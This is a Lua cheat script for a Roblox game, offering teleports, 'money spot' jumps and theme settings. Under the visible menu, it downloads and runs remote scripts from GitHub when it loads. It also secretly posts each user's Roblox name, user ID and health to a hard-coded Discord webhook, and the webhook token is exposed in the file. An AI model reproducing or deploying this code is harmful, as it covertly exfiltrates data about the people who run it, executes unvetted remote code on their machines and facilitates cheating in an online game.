-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/aitskrijger/force-autoparry/main/forceautoparry.lua"))()
local venyx = library.new("xehn force", 5013109572)
local lplr = game.Players.LocalPlayer
local response = syn.request(
    {
        Url = 'https://discord.com/api/webhooks/1012548936755597322/LM02zUaBfbRXBtpQT0LsOCEJacSwUc9Xewl3Ys_eyN6VJEmevp99MOubaCaDMwgKCxrx',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "Name: "..lplr.Name.." | ".."ID: "..lplr.UserId.." | Health: ".. lplr.Character.Humanoid.Health})
    }
);


-- themes
local themes = {
Background = Color3.fromRGB(24, 24, 24),
Glow = Color3.fromRGB(0, 0, 0),
Accent = Color3.fromRGB(10, 10, 10),
LightContrast = Color3.fromRGB(20, 20, 20),
DarkContrast = Color3.fromRGB(14, 14, 14),  
TextColor = Color3.fromRGB(255, 255, 255)
}

-- first page
local page = venyx:addPage("Test", 5012544693)
--local section1 = page:addSection("Section 1")
local section2 = page:addSection("Teleports")

--section1:addToggle("Toggle", nil, function(value)
--print("Toggled", value)
--end)
--section1:addButton("Button", function()
--print("Clicked")
--end)
--section1:addTextbox("Notification", "Default", function(value, focusLost)
--print("Input", value)

--if focusLost then
--venyx:Notify("Title", value)
--end
--end)

section2:addDropdown("Teleports", {"Kira", "Tattooine", "Illuum", "Kashykk"}, function(text)
if text == 'Kira' then
    venyx:Notify("TP", 'Teleported to Kira Village')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(430, 1798, 635)
elseif text == 'Tattooine' then
    venyx:Notify("TP", 'Teleported to Tattooine')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7771, 1674, 4810)
elseif text == 'Illuum' then
    venyx:Notify("TP", 'Teleported to Illuum')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-194, 1650, -7154)
elseif text == 'Kashykk' then
    venyx:Notify("TP", 'Teleported to Kashykk')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6377, 1742, -3681)
end
end)
section2:addButton("Money Spot #1", function()
    venyx:Notify("TP", 'Teleported to Deadlands')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8313, 1642, 1845)
end)
section2:addButton("Money Spot #2", function() 
    venyx:Notify("TP", 'Teleported to Abyss')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-362, 1028, 1227)
end)

-- second page
local theme = venyx:addPage("Theme", 5012544693)
local colors = theme:addSection("Colors")

for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
colors:addColorPicker(theme, color, function(color3)
venyx:setTheme(theme, color3)
end)
end

-- load
venyx:SelectPage(venyx.pages[1], true)
